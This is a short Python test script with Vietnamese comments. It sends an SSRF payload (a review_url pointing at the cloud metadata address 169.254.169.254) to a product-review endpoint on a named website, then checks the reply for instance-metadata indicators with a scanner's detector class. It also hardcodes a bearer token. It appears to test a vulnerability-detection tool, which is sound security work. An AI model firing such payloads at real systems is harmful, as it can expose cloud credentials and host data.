#!/usr/bin/env python3
"""Test SSRF manually với đúng Authorization header"""

import requests
import json
import sys
import os

# Add parent dir to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

url = "https://quangtx.io.vn/api/products/11/fetch_review/"

# Hardcode token for testing
headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiVVNFUiIsInN1YiI6InVzZXI3IiwiaWF0IjoxNzY0Mzk5MjIyLCJleHAiOjE3NjQ0ODU2MjJ9.JqIvvQ9IVAk9VZ7ajDUxdFCF2ISNEgOzmxtjxbc6Hvg"
}

print("=" * 60)
print("Testing SSRF Detection with tool logic")
print("=" * 60)
print(f"Headers: {list(headers.keys())}")

# Test với tool logic
from blackbox.detection.external_callback import ExternalCallbackDetector

detector = ExternalCallbackDetector()

# Extract searchable text test
data = {"review_url": "http://169.254.169.254/latest/meta-data/"}
response = requests.post(url, headers=headers, json=data, timeout=10)

print(f"\nStatus: {response.status_code}")
print(f"Raw response length: {len(response.text)}")

searchable = detector._extract_searchable_text(response.text)
print(f"Searchable text length: {len(searchable)}")
print(f"Searchable preview: {searchable[:200]}")

# Check for indicators
indicators = ['ami-id', 'instance-id', 'hostname', 'placement']
found = [ind for ind in indicators if ind.lower() in searchable.lower()]
print(f"\nFound indicators: {found}")
print(f"Is vulnerable: {len(found) > 0}")

print("\n" + "=" * 60)

